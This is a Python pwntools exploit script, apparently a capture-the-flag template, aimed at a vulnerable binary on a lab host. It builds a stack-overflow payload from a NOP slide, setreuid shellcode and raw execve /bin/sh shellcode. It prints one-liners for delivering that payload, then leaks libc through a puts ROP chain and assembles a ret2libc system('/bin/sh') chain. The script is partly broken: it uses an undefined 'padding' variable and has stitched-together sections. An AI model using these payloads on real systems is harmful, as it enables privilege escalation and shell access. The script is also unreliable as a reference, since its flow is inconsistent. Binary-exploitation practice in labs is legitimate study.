from sys import argv
from pwn import *

binary = './buffer-overflow'
host, port = '10.10.10.200:3737'.split(':')
port = int(port)

e = ELF(binary, checksec=False)         # setting pwntools context os/arch
context.os = 'linux'    # so that we won't have to specify it explicitly
context.arch = e.arch   # when using pwntools functions like asm etc.

# debug and log out
context.log_level = 'info'
info("starting exploit...")


params = ""

# Command line arguments handling
if args['REMOTE']:
    target = remote(host, port)
    libc = ELF('./libc.so.6')
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    target = gdb.debug([binary,params], gdbscript=gdbscript)
else:
    target = process([binary,params])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# cylic
g = cyclic_gen()
g.get(200)


# sending and receiving stuff
target.sendafter('hello', "payload")
target.sendline(b"1")
print(target.recvall())


# string to hex address (base 16)
rsp = target.recvuntil(b">")
buffer_addr = rsp[64:78]
new_buff_addr = int(buffer_addr,16) + 0x50


stackSize = 152

offset = b"\x90" * 90
trap = b"\xcc"
suid = asm(shellcraft.setreuid(1002))

binShell = asm(shellcraft.sh())

binShell =  b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
spacer = b"\x90" * (stackSize - len(suid) - len(offset) - len(binShell))
pointer = b"\xb8\xe0\xff\xff\xff\x7f"
new_pointer = p64(new_buff_addr)

returnAdd = 0x7fffffffe0e8
print("set Pointer before: " + hex(returnAdd - stackSize + len(offset)))

# packing
pointer = p64(0x7fffffffe09f)

# 48 bit to avoid null bits (addional substract 10 byte for the nop slide)
pointer = pack(0x7fffffffe09f-10,48)


# build the payload
payload = offset + suid + binShell + spacer + pointer


#print out the payload for python3
paystring = '\\x' + '\\x'.join('{:02x}'.format(x) for x in payload)

# payload print via pip to cat
print("(python -c 'print(b\"" + paystring + "\")'; cat) | ./intro2pwnFinal")
# python 3 payload as parameter
print("./buffer-overflow-2 `python3 -c 'import sys;sys.stdout.buffer.write(b\"" + paystring + "\")'`")
# and python 2 as parameter
print("./buffer-overflow-2 `python -c 'print(b\"" + paystring + "\")'`")
# gdb payload
print("r < <(python -c 'print(b\"" + paystring + "\")')")



target.send(payload)


# gdb.attach(target,gdbscript='''
# set follow-fork-mode child
# continue
# ''')


target.interactive()


### ELF and ROP findings


# take rops from elf, seach a pop rdi gateget to set params for the puts function
rop = ROP(e)
pop_rdi_gadget = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret_gadget = (rop.find_gadget(['ret']))[0]
ret_gadget = p64(ret_gadget)

# automate to find the first puts call, main call, and the puts in got
PUTS_PLT = e.plt['puts']
PUTS_GOT = e.got['puts']
MAIN_PLT = e.symbols['main']


exit = p64(e.symbols['exit'])
log.info("Main start: " + hex(MAIN_PLT))
log.info("puts plt: " + hex(PUTS_PLT))
log.info("puts plt in got: " + hex(PUTS_GOT))

main_addr = p64(MAIN_PLT)
puts_addr = p64(PUTS_PLT)
puts_got = p64(PUTS_GOT)


### read leakes address

leak = target.recvline()
print("leak \n")
print(leak)


# remove zero bytes from the rdi gadget address
clean_rdi_gadget = pop_rdi_gadget.replace(b"\x00",b"")

# find the rdi gagdet call from the leaked stack
l = leak.find(clean_rdi_gadget) + 3 

# retrieve the puts adress from the leak and fit it to 8bytes
puts_libc = u64(leak[l:l+6].ljust(8,b"\x00"))
log.success("Puts addr from libc: " + hex(puts_libc))


# Calculate LIBC addresses for system(address_to_"/bin/sh")
libc.address = puts_libc - libc.symbols['puts']
log.info("libc base @ %s" % hex(libc.address))

# Find system call and /bin/sh in the libc file
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
system_call = p64(SYSTEM)
binsh_got = p64(BINSH)

#send the second payload provide a second ret_gadget to adjust the stack

payload = padding + pop_rdi_gadget + binsh_got + ret_gadget + system_call + exit